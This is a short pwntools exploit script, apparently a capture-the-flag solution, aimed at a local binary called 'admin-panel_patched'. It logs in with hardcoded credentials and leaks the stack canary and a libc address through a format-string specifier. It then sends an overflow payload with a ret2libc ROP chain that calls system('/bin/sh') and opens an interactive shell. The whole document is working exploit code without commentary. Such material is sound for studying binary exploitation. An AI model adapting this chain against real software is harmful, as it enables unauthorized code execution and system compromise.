from pwn import *

libc_start_main_offset = 0x000000000002409b
pop_rdi_ret_offset = 0x23a5f
system_offset = 0x44af0
bin_sh_offset = 0x18052c

p = process("./admin-panel_patched")
p.recvline()
p.recvline()
p.sendline(b"adminaaaaaaaaaaa")
p.recvline()
p.sendline(b'secretpass123aaaaaaaaaaaaaaaaaaa%15$p,%17$p')
p.recvline()

leak_addr = p.recvline().decode()[:-1].split(',')
stack_cookie = int(leak_addr[0], 16)
libc_leak = int(leak_addr[1], 16)
print(f"stack cookie is: {hex(stack_cookie)}")
print(f"leaked address is: {hex(libc_leak)}")

libc_entrypoint = libc_leak - libc_start_main_offset
pop_rdi_ret = libc_entrypoint + pop_rdi_ret_offset

payload = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa'
payload += p64(stack_cookie)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_offset + libc_entrypoint)
payload += p64(system_offset + libc_entrypoint)

p.recvuntil(b'2 or 3:')
p.sendline(b'2')
p.recvuntil(b'wrong:')
p.sendline(payload)

p.interactive()
